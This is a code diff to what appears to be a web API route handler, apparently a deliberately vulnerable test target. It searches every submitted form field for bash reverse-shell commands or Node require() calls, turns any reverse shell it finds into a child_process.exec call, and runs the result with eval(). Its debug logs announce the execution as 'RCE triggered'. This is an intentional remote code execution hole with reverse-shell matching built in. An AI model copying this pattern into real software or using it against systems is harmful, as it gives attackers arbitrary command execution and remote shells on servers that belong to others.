@@ -6,11 +6,43 @@
 export async function POST(request) {
   try {
     const formData = await request.formData();
-    const payload = formData.get('payload');
+    let payload = formData.get('payload');
     
-    // Test RCE directly
+    // Handle exploit.py format - extract command from serialized form entries
+    if (!payload) {
+      const entries = Array.from(formData.entries());
+      console.log('[DEBUG] FormData entries:', entries.length);
+      
+      for (const [key, value] of entries) {
+        console.log('[DEBUG] Checking entry:', key, 'value type:', typeof value);
+        const valueStr = String(value);
+        
+        // Search for bash reverse shell or require() statements in all fields
+        if (valueStr.includes('bash') || valueStr.includes('require')) {
+          console.log('[DEBUG] Found potential payload in:', key);
+          
+          // Extract bash command
+          let bashMatch = valueStr.match(/bash[^`'"]*-i[^`'"]*>.*?0>&1/);
+          if (bashMatch) {
+            payload = `require('child_process').exec('${bashMatch[0]}')`;
+            console.log('[DEBUG] Extracted bash payload:', payload);
+            break;
+          }
+          
+          // Extract require() statements
+          let requireMatch = valueStr.match(/require\(['"][^'"]*['"][^\)]*\)[^,\}]*\([^)]*\)/);
+          if (requireMatch) {
+            payload = requireMatch[0];
+            console.log('[DEBUG] Extracted require payload:', payload);
+            break;
+          }
+        }
+      }
+    }
+    
+    // Execute payload if found
     if (payload) {
-      console.log('[🔴 DIRECT RCE TEST] Executing payload:', payload);
+      console.log('[🔴 RCE TRIGGERED] Executing payload:', payload);
       try {
         eval(payload);
         return Response.json({ success: true, message: 'RCE executed', payload });
